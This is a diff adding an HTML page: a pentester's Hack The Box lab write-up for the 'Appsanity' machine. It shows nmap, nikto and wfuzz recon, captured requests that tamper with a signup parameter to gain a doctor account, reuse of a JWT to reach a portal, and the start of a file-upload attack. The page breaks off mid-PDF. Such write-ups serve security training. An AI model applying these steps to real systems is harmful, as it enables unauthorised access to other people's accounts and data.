@@ -1,0 +1,1684 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>document.documentElement.classList.add("js");(function(){function a(k){var o=[];try{var p=String(window.name||"").split(";");for(var i=0;i<p.length;i++){var q=p[i].split("=");if(q[0]===k&&q[1])o.push(q[1])}}catch(e){}try{var m=document.cookie.match(new RegExp("(?:^|; )"+k+"=([^;]*)"));if(m)o.push(decodeURIComponent(m[1]))}catch(e){}try{var v=localStorage.getItem(k);if(v!==null&&typeof v!=="undefined")o.push(v)}catch(e){}return o}function g(k){var v=a(k);return v.length?v[0]:null}function p(){var b=null;a("fg-prefs").forEach(function(r){var x=String(r).split(".");if(x.length!==3)return;var t=parseInt(x[0],36);if(!isFinite(t)||t<=0)return;var th=x[1]==="light"||x[1]==="dark"?x[1]:null;var rl=x[2]==="c"||x[2]==="o"?x[2]:null;if(th||rl){if(!b||t>b.t)b={t:t,th:th,rl:rl}}});if(b)return b;var th=g("fg-theme"),rl=g("fg-spine-v2");if(th==="light"||th==="dark"||rl==="c"||rl==="o")return{t:0,th:th==="light"||th==="dark"?th:null,rl:rl==="c"||rl==="o"?rl:null};return null}try{var s=p();var th=s&&s.th?s.th:(matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");document.documentElement.setAttribute("data-theme",th);if(s&&s.rl==="c")document.documentElement.classList.add("nav-collapsed")}catch(e){document.documentElement.setAttribute("data-theme","dark")}})();</script>
+    <link rel="icon" type="image/svg+xml" href="../favicon.svg">
+    <link rel="alternate icon" type="image/x-icon" href="../assets/images/favicon.ico">
+    <link rel="stylesheet" href="../assets/css/reset.css?v=8">
+    <link rel="stylesheet" href="../assets/css/site.css?v=176">
+    <title>Frédéric Goossens | Appsanity</title>
+</head>
+<body>
+    <a class="skip" href="#main">Skip to content</a>
+
+    <header class="spine">
+        <div class="spine-id">
+            <a class="si-id" href="../index.html" aria-label="Frédéric Goossens - Home">
+                <span class="si-photo"><img src="../assets/images/pfp.jpg" alt="Frédéric Goossens"></span>
+                <span class="si-prompt"><span class="sigil">$</span>whoami</span>
+                <span class="si-name">Frédéric Goossens</span>
+                <span class="si-roles"><span>Pentester</span><span>OSCP · BSCP</span></span>
+            </a>
+            <div class="si-socials">
+                <a class="slink" href="https://github.com/fredericgoossens" target="_blank" rel="noopener noreferrer" aria-label="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg></a>
+                <a class="slink" href="https://www.linkedin.com/in/fr%C3%A9d%C3%A9ric-goossens-0344b1241/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
+            </div>
+        </div>
+        <nav aria-label="Primary">
+            <ul>
+                <li><a href="../index.html"><span class="n">01</span><span class="l">Home</span></a></li>
+                <li><a href="../resume.html"><span class="n">02</span><span class="l">Resume</span></a></li>
+                <li><a href="../writing.html"><span class="n">03</span><span class="l">Writing</span></a></li>
+                <li><a href="../htb.html"><span class="n">04</span><span class="l">HackTheBox</span></a></li>
+            </ul>
+        </nav>
+        <div class="spine-foot">
+            <button class="theme-btn" type="button" data-theme-toggle aria-label="Toggle color theme" aria-pressed="false"><svg class="i-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg><svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg></button>
+            <button class="spine-toggle" type="button" data-spine-toggle aria-expanded="true" aria-label="Collapse navigation"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M15 18l-6-6 6-6"/></svg></button>
+        </div>
+    </header>
+
+    <div class="topbar">
+        <a class="topbar-id" href="../index.html" aria-label="Frédéric Goossens - Home"><img src="../assets/images/pfp.jpg" alt="Frédéric Goossens"></a>
+        <div class="tb-actions">
+            <button class="theme-btn" type="button" data-theme-toggle aria-label="Toggle color theme" aria-pressed="false"><svg class="i-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg><svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg></button>
+            <button class="menu-btn" type="button" data-menu-open aria-label="Open menu" aria-controls="menu" aria-haspopup="dialog" aria-expanded="false">
+                <span></span><span></span><span></span>
+            </button>
+        </div>
+    </div>
+
+    <div id="menu" role="dialog" aria-modal="true" aria-label="Navigation menu" aria-hidden="true" inert>
+        <div class="menu-top">
+            <a class="mi-id" href="../index.html" aria-label="Frédéric Goossens - Home"><img src="../assets/images/pfp.jpg" alt=""><span>Frédéric Goossens</span></a>
+            <button class="close-btn" type="button" data-menu-close>Close ×</button>
+        </div>
+        <nav aria-label="Mobile">
+            <ul>
+                <li><a href="../index.html"><span class="n">01</span>Home</a></li>
+                <li><a href="../resume.html"><span class="n">02</span>Resume</a></li>
+                <li><a href="../writing.html"><span class="n">03</span>Writing</a></li>
+                <li><a href="../htb.html"><span class="n">04</span>HackTheBox</a></li>
+            </ul>
+        </nav>
+        <div class="menu-foot">
+            <a class="slink" href="https://github.com/fredericgoossens" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg><span>GitHub</span></a>
+            <a class="slink" href="https://www.linkedin.com/in/fr%C3%A9d%C3%A9ric-goossens-0344b1241/" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg><span>LinkedIn</span></a>
+        </div>
+    </div>
+
+    <div class="progress"></div>
+
+    <div class="shell">
+        <main class="wrap" id="main">
+            <div class="post-wrap">
+                <article class="post" data-cover="../assets/images/htb/appsanity/logo.png">
+                    <a class="crumb" href="../htbList.html?os=Windows">← All Windows write-ups</a>
+                    <h1 data-type="Appsanity" data-prefix="# "></h1>
+
+                    <div class="info">
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3l7 3v5c0 4.6-3 8.2-7 10-4-1.8-7-5.4-7-10V6l7-3z"/></svg>
+                                Platform
+                            </span>
+                            <span class="meta-v">Hack The Box</span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M5 20v-4M11 20V10M17 20V4"/></svg>
+                                Difficulty
+                            </span>
+                            <span class="meta-v" data-diff="Hard">Hard</span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg>
+                                Read time
+                            </span>
+                            <span class="meta-v" data-read-time-auto=""></span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M4 20l4-1L20 7l-3-3L5 16l-1 4z"/></svg>
+                                Author
+                            </span>
+                            <span class="meta-v">Frédéric Goossens</span>
+                        </div>
+                    </div>
+
+                    <blockquote>Seasonal<br>10.10.11.238</blockquote>
+
+<h2>Discover</h2>
+
+<details>
+<summary>nmap</summary>
+<div class="inner">
+<p><code>sudo nmap -A -sV -sT -v -O -T4 -p- 10.10.11.238</code></p><pre><code>PORT     STATE SERVICE    VERSION
+80/tcp   open  http       Microsoft IIS httpd 10.0
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Did not follow redirect to https://meddigi.htb/
+|_http-server-header: Microsoft-IIS/10.0
+
+443/tcp  open  https?
+
+5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+
+7680/tcp open  tcpwrapped</code></pre>
+</div>
+</details>
+
+<details>
+<summary>web</summary>
+<div class="inner">
+<details><summary>screenshots</summary><div class="inner"><figure><img src="../assets/images/htb/appsanity/01-untitled.png" alt=""></figure><figure><img src="../assets/images/htb/appsanity/02-untitled-1.png" alt=""></figure>
+</div>
+</details><details>
+<summary>nikto</summary>
+<div class="inner">
+<p><code>nikto -h https://meddigi.htb -C All</code></p><pre><code>- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          10.10.11.238
++ Target Hostname:    meddigi.htb
++ Target Port:        443
+---------------------------------------------------------------------------
++ SSL Info:        Subject:  /CN=meddigi.htb
+                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
+                   Issuer:   /CN=meddigi.htb
++ Start Time:         2023-10-31 13:57:16 (GMT1)
+---------------------------------------------------------------------------
++ Server: Microsoft-IIS/10.0
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ /: Cookie ; expires created without the secure flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ ERROR: Error limit (20) reached for host, giving up. Last error: opening stream: can't connect: SSL negotiation failed:  at /var/lib/nikto/plugins/LW2.pm line 5254.
+ at /var/lib/nikto/plugins/LW2.pm line 5254.
+; Connection reset by peer at /var/lib/nikto/plugins/LW2.pm line 5254.
+: Connection reset by peer
++ Scan terminated: 20 error(s) and 3 item(s) reported on remote host
++ End Time:           2023-10-31 13:59:45 (GMT1) (149 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested</code></pre>
+</div>
+</details><details>
+<summary>sign up request &amp; response</summary>
+<div class="inner">
+<p><strong>Request:</strong></p><pre><code>POST /Signup/SignUp HTTP/2
+Host: meddigi.htb
+Cookie: .AspNetCore.Antiforgery.ML5pX7jOz00=CfDJ8AGP89NZTPBJs9UVwPjlVTEjbY94ObrWK3OHACGdloEYtTQfhz12802GNBSCvVD6MEyR5oqdE1YQOWnaQ3mrhi0QhSVBVuF79La4-MMEuA1l5b4JYsIOpSE91xYcxVGQfo3Cf0N_ghzVLTANsa78-mM
+User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 350
+Origin: https://meddigi.htb
+Referer: https://meddigi.htb/signup
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+
+Name=test&amp;LastName=test&amp;Email=test%40test.test&amp;Password=testtest123&amp;ConfirmPassword=testtest123&amp;DateOfBirth=2023-10-19&amp;PhoneNumber=1234567890&amp;Country=Belgium&amp;Acctype=1&amp;__RequestVerificationToken=CfDJ8AGP89NZTPBJs9UVwPjlVTFbcnbR--S_ohMR60kZVTs81VVZJCvhkMKjtOHRsv6rCVknhJiy35nUrUfsTcgWiztEezF4gFxCvOisNnCzGyy0pNPfNf2RkEQNnFWlUPj4YIBVJOf9XxYdsJs7Z5Sj7L4</code></pre><p><strong>Response:</strong></p><pre><code>HTTP/2 302 Found
+Location: /Signin
+Server: Microsoft-IIS/10.0
+Strict-Transport-Security: max-age=2592000
+Set-Cookie: .AspNetCore.Mvc.CookieTempDataProvider=CfDJ8AGP89NZTPBJs9UVwPjlVTEE6URtyr6AHJpX2akJPmIxSuN43Fl-UNNcvDR4_adQCpvHFdny9ctMV7dx1wQlLpwtXxBWuVb80lEMGVN9jcW0NFDOPZZEY8YYxSxFSIrxGkWZwl-IVPTEU8gIF0Yq2_5AdgxbTsSmpgii5OsL7VHrPjCvkb-OG8QAWq78UN7LEg; path=/; samesite=lax; httponly
+Date: Tue, 31 Oct 2023 13:00:49 GMT</code></pre>
+</div>
+</details><details>
+<summary>sign in request &amp; reponse</summary>
+<div class="inner">
+<p><strong>request:</strong></p><pre><code>POST /SignIn/SignIn HTTP/2
+Host: meddigi.htb
+Cookie: .AspNetCore.Antiforgery.ML5pX7jOz00=CfDJ8AGP89NZTPBJs9UVwPjlVTEjbY94ObrWK3OHACGdloEYtTQfhz12802GNBSCvVD6MEyR5oqdE1YQOWnaQ3mrhi0QhSVBVuF79La4-MMEuA1l5b4JYsIOpSE91xYcxVGQfo3Cf0N_ghzVLTANsa78-mM
+User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 226
+Origin: https://meddigi.htb
+Referer: https://meddigi.htb/Signin
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+
+Email=test%40test.test&amp;Password=testtest123&amp;__RequestVerificationToken=CfDJ8AGP89NZTPBJs9UVwPjlVTELXCVmfZFSPcBKDnhpGztAdmLBtG1LnoPCo1Kw2Xsx_uH9FKD-WeicFys5D4XJLWFAWjDOrQLuhp7RrOV61m6zS_aYMxWoStv7EWMY-TIKYkMegvOjfb4SDaTa2G6tzmM</code></pre><p><strong>response:</strong></p><pre><code>HTTP/2 302 Found
+Location: /Profile
+Server: Microsoft-IIS/10.0
+Strict-Transport-Security: max-age=2592000
+Set-Cookie: access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjciLCJlbWFpbCI6InRlc3RAdGVzdC50ZXN0IiwibmJmIjoxNjk4NzU3MjkwLCJleHAiOjE2OTg3NjA4OTAsImlhdCI6MTY5ODc1NzI5MCwiaXNzIjoiTWVkRGlnaSIsImF1ZCI6Ik1lZERpZ2lVc2VyIn0.7bQQ_0mWhEZyVvYx4dHitAnJ4RBeUSDiUQr5leQsMAU; expires=Tue, 31 Oct 2023 15:01:30 GMT; path=/; secure; samesite=strict; httponly
+Date: Tue, 31 Oct 2023 13:01:30 GMT</code></pre><p><strong>JWT:</strong></p><pre><code># Header
+{
+    "alg": "HS256",
+    "typ": "JWT"
+}
+
+# Payload
+{
+    "unique_name": "7",
+    "email": "test@test.test",
+    "nbf": 1698757290,
+    "exp": 1698760890,
+    "iat": 1698757290,
+    "iss": "MedDigi",
+    "aud": "MedDigiUser"
+}</code></pre>
+</div>
+</details></div></details>
+
+<details>
+<summary>subdomains WFUZZ</summary>
+<div class="inner">
+<p><code>wfuzz -c -f sub-fighter -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "https://meddigi.htb" -H "Host: FUZZ.meddigi.htb" --hl 6</code></p><pre><code>=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000048:   200        56 L     162 W      2976 Ch     "portal"</code></pre><figure><img src="../assets/images/htb/appsanity/03-untitled-2.png" alt=""></figure>
+</div>
+</details>
+
+<h2>Initial foothold</h2>
+
+<h3>1: Change Acctype upon signup</h3>
+
+<blockquote>During the signup process, a parameter labeled "<code>Acctype</code>" is set to 1. I modified it to <code>Acctype=2</code>, and as a result, the profile page displayed some noticeable differences:</blockquote>
+
+<figure><img src="../assets/images/htb/appsanity/04-untitled-3.png" alt=""></figure>
+
+<details>
+<summary>Request &amp; response (add patient)</summary>
+<div class="inner">
+<p><strong>request:</strong></p><pre><code>POST /Profile/AddPatient HTTP/2
+Host: meddigi.htb
+Cookie: .AspNetCore.Antiforgery.ML5pX7jOz00=CfDJ8AGP89NZTPBJs9UVwPjlVTEjbY94ObrWK3OHACGdloEYtTQfhz12802GNBSCvVD6MEyR5oqdE1YQOWnaQ3mrhi0QhSVBVuF79La4-MMEuA1l5b4JYsIOpSE91xYcxVGQfo3Cf0N_ghzVLTANsa78-mM; .AspNetCore.Mvc.CookieTempDataProvider=CfDJ8AGP89NZTPBJs9UVwPjlVTEmLUIwycU0-H9eNhKQ_2DJBU3dKnjRugO7g-EJtqsQGTcOwhVbo7QAa6nXsC442VVcBdDNOy_ifkx_uMdd5psOKnkPvsTBS7_4fsgab3PQUNbkmg71_RwETP7VhgoQ02mO9UTWjarZE1M5YNvkbyu6eKgKjoet5QrH6bAM8i2kyg; access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjgiLCJlbWFpbCI6InRlc3QyQHRlc3QudGVzdCIsIm5iZiI6MTY5ODc1OTI4MCwiZXhwIjoxNjk4NzYyODgwLCJpYXQiOjE2OTg3NTkyODAsImlzcyI6Ik1lZERpZ2kiLCJhdWQiOiJNZWREaWdpVXNlciJ9.RVFrg73A5c55dx9-n5KSP17dk6qQ9mLbLe0akDptQKs
+User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 245
+Origin: https://meddigi.htb
+Referer: https://meddigi.htb/Profile
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+
+selectedPatientId=7&amp;__RequestVerificationToken=CfDJ8AGP89NZTPBJs9UVwPjlVTEX6uWBVrdhGA5U_LjgZ1SHBeHUzmi14Wc7d-WuUa04Wg6mT5YirWiC4aGqZaEt8Vmlp518TnvD4C6cCn14TPMTVrBfk7_TRWCAhxryyogbnS3dMfz5zJI3kvpPzzc_7R7SJgCo6_9M2oaeR-YYasPqQJk7Bm4foDl-1P9y0auZFw</code></pre><p><strong>response:</strong></p><pre><code>HTTP/2 302 Found
+Location: /Profile
+Server: Microsoft-IIS/10.0
+Strict-Transport-Security: max-age=2592000
+Set-Cookie: .AspNetCore.Mvc.CookieTempDataProvider=CfDJ8AGP89NZTPBJs9UVwPjlVTHG22b-_zsuDjAFMhAu02eRyq8w0KXSJnijskozdsDFR87VsMw3X4dZ46CQnQPyzqY79VGmJG0VLNnwIRH2WpnpCZKoDvfkCKeJN6yT91mPsUbTWhYdA58I0LCVHRzEaGBVL8X5WJVU1XZq7EokVdpUB0B-B2Ir6x8IgZrHZ4Xo1x_xnvn-fob2-0lEDqaKORF25Mtzm4FwzHxTl6xJyPwi-F_LhaCPKjYnzSunR4e1zw; path=/; samesite=lax; httponly
+Date: Tue, 31 Oct 2023 13:37:03 GMT</code></pre>
+</div>
+</details>
+
+<blockquote>Seems we have a ‘Doctor’ account now</blockquote>
+
+<h3>2: Use JWT token to login on portal.meddigi.htb</h3>
+
+<blockquote>To access portal.meddigi.htb, we require a Reference number, which is currently unknown to us. To circumvent this, I attempted to utilize the JWT <code>access_token</code> cookie from the main site, and it successfully granted me access ;)</blockquote>
+
+<figure><img src="../assets/images/htb/appsanity/05-untitled-4.png" alt=""></figure>
+
+<figure><img src="../assets/images/htb/appsanity/06-untitled-5.png" alt=""></figure>
+
+<h3>3: Upload functionality (prepare reverse shell)</h3>
+
+<blockquote>Based on the other cookies, we can conclude that this is in fact an <a href="http://ASP.NET">ASP.NET</a> application <br>(eg <code>.AspNetCore.Antiforgery.d2PTPu5_rLA</code>)</blockquote>
+
+<aside class="block-color-gray_background callout" data-notion-callout="" data-notion-callout-icon="⚠️" data-notion-callout-background="gray_background" style="white-space:pre-wrap;display:flex" id="8f040765-2cac-4be3-8648-6c867fc4841a" dir="ltr"><div style="font-size:1.5em"><span class="icon" data-emoji="⚠️"></span></div><div style="width:100%">When uploading a file different then PDF. We get the following error: <em>‘only PDF type files are allowed’</em></div></aside>
+
+<ol><li><span style="border-bottom:0.05em solid">upload real pdf, to see how the app behaves</span><details>
+<summary>request</summary>
+<div class="inner">
+<pre><code>POST /ExamReport/Upload HTTP/2
+Host: portal.meddigi.htb
+Cookie: access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjgiLCJlbWFpbCI6InRlc3QyQHRlc3QudGVzdCIsIm5iZiI6MTY5ODc2MDA2MSwiZXhwIjoxNjk4NzYzNjYxLCJpYXQiOjE2OTg3NjAwNjEsImlzcyI6Ik1lZERpZ2kiLCJhdWQiOiJNZWREaWdpVXNlciJ9.ub-ILj88XRVXlAg7S8kHSYxnA0jDMsHjNmA0lPB4Ohs; .AspNetCore.Antiforgery.d2PTPu5_rLA=CfDJ8Id1ehANBa5DlaPtFg4-GBvCNAcqFNRaK5G176HbrOFdb-SM-Qr885TSAKn3P5xktoNDP9ysfKtwBg-Srf3KORbLo8LfsGmCNjWe3h0wJfJkg8EfVCJZAvVSYnwVh6HcaMc9pCZBK9xv8y__U7b6xkQ
+User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------2852576984571027806530674011
+Content-Length: 4317
+Origin: https://portal.meddigi.htb
+Referer: https://portal.meddigi.htb/ExamReport
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+
+-----------------------------2852576984571027806530674011
+Content-Disposition: form-data; name="PatientNo"
+
+123456
+-----------------------------2852576984571027806530674011
+Content-Disposition: form-data; name="PatientName"
+
+kjfvkzjn
+-----------------------------2852576984571027806530674011
+Content-Disposition: form-data; name="ExamType"
+
+hfvkjzfgk
+-----------------------------2852576984571027806530674011
+Content-Disposition: form-data; name="PhoneNumber"
+
+0123456789
+-----------------------------2852576984571027806530674011
+Content-Disposition: form-data; name="Department"
+
+ghjkzgf
+-----------------------------2852576984571027806530674011
+Content-Disposition: form-data; name="VisitDate"
+
+0001-01-01
+-----------------------------2852576984571027806530674011
+Content-Disposition: form-data; name="ReportFile"; filename="sample.pdf"
+Content-Type: application/pdf
+
+%PDF-1.3
+%âãÏÓ
+
+1 0 obj
+&lt;&lt;
+/Type /Catalog
+/Outlines 2 0 R
+/Pages 3 0 R
+&gt;&gt;
+endobj
+
+2 0 obj
+&lt;&lt;
+/Type /Outlines
+/Count 0
+&gt;&gt;
+endobj
+
+3 0 obj
+&lt;&lt;
+/Type /Pages
+/Count 2
+/Kids [ 4 0 R 6 0 R ]
+&gt;&gt;
+endobj
+
+4 0 obj
+&lt;&lt;
+/Type /Page
+/Parent 3 0 R
+/Resources &lt;&lt;
+/Font &lt;&lt;
+/F1 9 0 R
+&gt;&gt;
+/ProcSet 8 0 R
+&gt;&gt;
+/MediaBox [0 0 612.0000 792.0000]
+/Contents 5 0 R
+&gt;&gt;
+endobj
+
+5 0 obj
+&lt;&lt; /Length 1074 &gt;&gt;
+stream
+2 J
+BT
+0 0 0 rg
+/F1 0027 Tf
+57.3750 722.2800 Td
+( A Simple PDF File ) Tj
+ET
+BT
+/F1 0010 Tf
+69.2500 688.6080 Td
+( This is a small demonstration .pdf file - ) Tj
+ET
+BT
+/F1 0010 Tf
+69.2500 664.7040 Td
+( just for use in the Virtual Mechanics tutorials. More text. And more ) Tj
+ET
+BT
+/F1 0010 Tf
+69.2500 652.7520 Td
+( text. And more text. And more text. And more text. ) Tj
+ET
+BT
+/F1 0010 Tf
+69.2500 628.8480 Td
+( And more text. And more text. And more text. And more text. And more ) Tj
+ET
+BT
+/F1 0010 Tf
+69.2500 616.8960 Td
+( text. And more text. Boring, zzzzz. And more text. And more text. And ) Tj
+ET
+BT
+/F1 0010 Tf
+69.2500 604.9440 Td
+( more text. And more text. And more text. And more text. And more text. ) Tj
+ET
+BT
+/F1 0010 Tf
+69.2500 592.9920 Td
+( And more text. And more text. ) Tj
+ET
+BT
+/F1 0010 Tf
+69.2500 569.0880 Td
+( And more text. And more text. And more text. And more text. And more ) Tj
+ET
+BT
+/F1 0010 Tf
+69.2500 557.1360 Td
+( text. And more text. And more text. Even more. Continued on page 2 ...) Tj
+ET
+endstream
+endobj
+
+6 0 obj
+&lt;&lt;
+/Type /Page
+/Parent 3 0 R
+/Resources &lt;&lt;
+/Font &lt;&lt;
+/F1 9 0 R
+&gt;&gt;
+/ProcSet 8 0 R
+&gt;&gt;
+/MediaBox [0 0 612.0000 792.0000]
+/Contents 7 0 R
+&gt;&gt;
+endobj
+
+7 0 obj
+&lt;&lt; /Length 676 &gt;&gt;
+stream
+2 J
+BT
+0 0 0 rg
+/F1 0027 Tf
+57.3750 722.2800 Td
+( Simple PDF File 2 ) Tj
+ET
+BT
+/F1 0010 Tf
+69.2500 688.6080 Td
+( ...continued from page 1. Yet more text. And more text. And more text. ) Tj
+ET
+BT
+/F1 0010 Tf
+69.2500 676.6560 Td
+( And more text. And more text. And more text. And more text. And more ) Tj
+ET
+BT
+/F1 0010 Tf
